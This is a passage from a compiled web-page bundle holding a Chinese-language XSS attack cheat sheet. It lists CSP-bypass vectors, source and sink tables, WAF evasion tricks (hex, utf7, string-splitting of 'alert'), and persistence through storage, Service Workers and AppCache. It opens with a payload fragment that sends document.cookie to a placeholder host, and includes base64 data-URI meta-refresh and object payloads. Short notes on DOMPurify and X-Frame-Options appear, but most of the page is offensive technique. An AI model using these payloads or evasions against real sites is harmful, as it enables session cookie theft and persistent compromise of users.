<span class="line"><span style="color:#24292e;">//@        sourceMappingURL=http://xxxx/\`+document.cookie+\`&lt;\\/script&gt;\`);\`\`</span></span></code></pre></div><ul><li>a标签的ping属性</li><li>For FireFox： <blockquote><p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p></blockquote></li><li><code>&lt;link rel=&quot;import&quot; /&gt;</code></li><li><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></li><li>仅限制 script-src 时： <blockquote><p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p></blockquote></li></ul><h2 id="xss数据源" tabindex="-1">XSS数据源 <a class="header-anchor" href="#xss数据源" aria-label="Permalink to &quot;XSS数据源&quot;">​</a></h2><table><thead><tr><th>途径</th><th>说明</th></tr></thead><tbody><tr><td>URL</td><td><code>location</code> <code>location.href</code> <code>location.pathname</code> <code>location.search</code> <code>location.hash</code> <code>document.URL</code> <code>document.documentURI</code> <code>document.baseURI</code></td></tr><tr><td>Navigation</td><td><code>window.name</code> <code>document.referrer</code></td></tr><tr><td>Communication</td><td><code>Ajax</code> <code>Fetch</code> <code>WebSocket</code> <code>PostMessage</code></td></tr><tr><td>Storage</td><td><code>Cookie</code> <code>LocalStorage</code> <code>SessionStorage</code></td></tr></tbody></table><h2 id="sink" tabindex="-1">Sink <a class="header-anchor" href="#sink" aria-label="Permalink to &quot;Sink&quot;">​</a></h2><ul><li><p>执行JavaScript：</p><ul><li><code>eval(payload)</code></li><li><code>setTimeout(payload, 100)</code></li><li><code>setInterval(payload, 100)</code></li><li><code>Function(payload)()</code></li><li><code>&lt;script&gt;payload&lt;/script&gt;</code></li><li><code>&lt;img src=x onerror=payload&gt;</code></li></ul></li><li><p>加载URL：</p><ul><li><code>location=javascript:alert(/xss/)</code></li><li><code>location.href=javascript:alert(/xss/)</code></li><li><code>location.assign(javascript:alert(/xss/))</code></li><li><code>location.replace(javascript:alert(/xss/))</code></li></ul></li><li><p>执行HTML：</p><ul><li><code>xx.innerHTML=payload</code></li><li><code>xx.outerHTML=payload</code></li><li><code>document.write(payload)</code></li><li><code>document.writeln(payload)</code></li></ul></li></ul><h2 id="xss保护" tabindex="-1">XSS保护 <a class="header-anchor" href="#xss保护" aria-label="Permalink to &quot;XSS保护&quot;">​</a></h2><h3 id="html过滤" tabindex="-1">HTML过滤 <a class="header-anchor" href="#html过滤" aria-label="Permalink to &quot;HTML过滤&quot;">​</a></h3><p>使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。</p><h3 id="x-frame" tabindex="-1">X-Frame <a class="header-anchor" href="#x-frame" aria-label="Permalink to &quot;X-Frame&quot;">​</a></h3><p>X-Frame-Options 响应头有三个可选的值：</p><ul><li><code>DENY</code>：页面不能被嵌入到任何iframe或frame中</li><li><code>SAMEORIGIN</code>：页面只能被本站页面嵌入到iframe或者frame中</li><li><code>ALLOW-FROM</code>：页面允许frame或frame加载</li></ul><h2 id="waf-bypass" tabindex="-1">WAF Bypass <a class="header-anchor" href="#waf-bypass" aria-label="Permalink to &quot;WAF Bypass&quot;">​</a></h2><ul><li><p>利用&lt;&gt;标记</p></li><li><p>利用html属性</p><ul><li>href</li><li>lowsrc</li><li>bgsound</li><li>background</li><li>value</li><li>action</li><li>dynsrc</li></ul></li><li><p>关键字</p><ul><li>利用回车拆分</li><li>字符串拼接：<code>window[&quot;al&quot; + &quot;ert&quot;]</code></li></ul></li><li><p>利用编码绕过</p><ul><li>base64</li><li>jsfuck</li><li>String.fromCharCode</li><li>HTML</li><li>URL</li><li>hex：<code>window[&quot;\\x61\\x6c\\x65\\x72\\x74&quot;]</code></li><li>unicode</li><li>utf7：<code>+ADw-script+AD4-alert(&#39;XSS&#39;)+ADsAPA-/script+AD4-</code></li><li>utf16</li></ul></li><li><p>大小写混淆</p></li><li><p>对标签属性值转码</p></li><li><p>产生事件</p></li><li><p>css跨站解析</p></li><li><p>长度限制bypass</p><ul><li><code>eval(name)</code></li><li><code>eval(hash)</code></li><li><code>import</code></li><li><code>$.getScript</code></li><li><code>$.get</code></li></ul></li><li><p><code>.</code></p><ul><li>使用 。 绕过IP/域名</li><li>document[&#39;cookie&#39;] 绕过属性取值</li></ul></li><li><p>过滤引号用 <code>\`</code> 绕过</p></li></ul><h2 id="技巧" tabindex="-1">技巧 <a class="header-anchor" href="#技巧" aria-label="Permalink to &quot;技巧&quot;">​</a></h2><ul><li>httponly</li><li>CSS 注入</li><li>Bypass Via Script Gadgets</li><li>RPO(Relative Path Overwrite)</li></ul><h2 id="payload" tabindex="-1">Payload <a class="header-anchor" href="#payload" aria-label="Permalink to &quot;Payload&quot;">​</a></h2><p>整理中...</p><h2 id="持久化" tabindex="-1">持久化 <a class="header-anchor" href="#持久化" aria-label="Permalink to &quot;持久化&quot;">​</a></h2><h3 id="基于存储" tabindex="-1">基于存储 <a class="header-anchor" href="#基于存储" aria-label="Permalink to &quot;基于存储&quot;">​</a></h3><p>有时候网站会将信息存储在Cookie或localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对Cookie或localStorage中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了JSON格式的数据时，部分站点存在 eval(data) 之类的调用。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。</p><p>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 String.fromCharCode 来绕过。</p><h3 id="service-worker" tabindex="-1">Service Worker <a class="header-anchor" href="#service-worker" aria-label="Permalink to &quot;Service Worker&quot;">​</a></h3><p>Service Worker可以拦截http请求，起到类似本地代理的作用，故可以使用Service Worker Hook一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</p><p>在Chrome中，可通过 <code>chrome://inspect/#service-workers</code> 来查看Service Worker的状态，并进行停止。</p><h3 id="appcache" tabindex="-1">AppCache <a class="header-anchor" href="#appcache" aria-label="Permalink to &quot;AppCache&quot;">​</a></h3><p>在可控的网络环境下（公共wifi），可以使用AppCache机制，来强制存储一些Payload，未清除的情况下，用户访问站点时对应的payload会一直存在。</p>`,83),n=[e];function p(c,r,i,d,y,u){return a(),l("div",null,n)}const g=s(t,[["render",p]]);export{h as __pageData,g as default};
